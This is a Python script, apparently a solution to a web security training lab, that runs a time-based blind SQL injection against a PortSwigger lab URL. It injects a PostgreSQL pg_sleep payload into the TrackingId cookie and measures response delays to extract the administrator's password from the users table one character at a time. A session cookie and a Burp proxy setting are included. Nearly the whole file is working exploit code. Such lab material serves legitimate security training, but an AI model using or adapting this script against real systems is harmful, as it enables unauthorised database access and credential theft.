import requests
import string
import time

# Configuration
url = "https://0a2e00910327c18688742987002800fa.web-security-academy.net/filter?category=Pets"
cookie_name = "TrackingId"
charset = string.ascii_lowercase + string.digits  # Characters to test
password_length = 20
cookies = {"session": "m8Dk3i94YpUBo6l3YwctEaPu4oGmMz7S"}
tracking_id_template = (
    "'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{position},1)='{char}')"
    "+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--"
)

# verify our connection to burpsuite proxy 
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
response = requests.get(url, cookies=cookies, proxies=proxies, verify=False)


def test_char_at_position(position, char):
    # Build payload
    payload = tracking_id_template.format(position=position, char=char)
    cookies[cookie_name] = payload

    # Measure response time
    start_time = time.time()
    try:
        response = requests.get(url, cookies=cookies, timeout=10)
    except requests.exceptions.RequestException as e:
        print(f"Request error: {e}")
        return False

    elapsed_time = time.time() - start_time
    return elapsed_time > 5  # True if sleep(5) was triggered

def find_password():
    password = ""
    for position in range(1, password_length + 1):
        for char in charset:
            print(f"Testing position {position} with character '{char}'")
            if test_char_at_position(position, char):
                password += char
                print(f"Found character '{char}' at position {position}")
                break
        else:
            print(f"No match found for position {position}")
    return password

if __name__ == "__main__":
    print("Starting password extraction...")
    password = find_password()
    print(f"Password is: {password}")
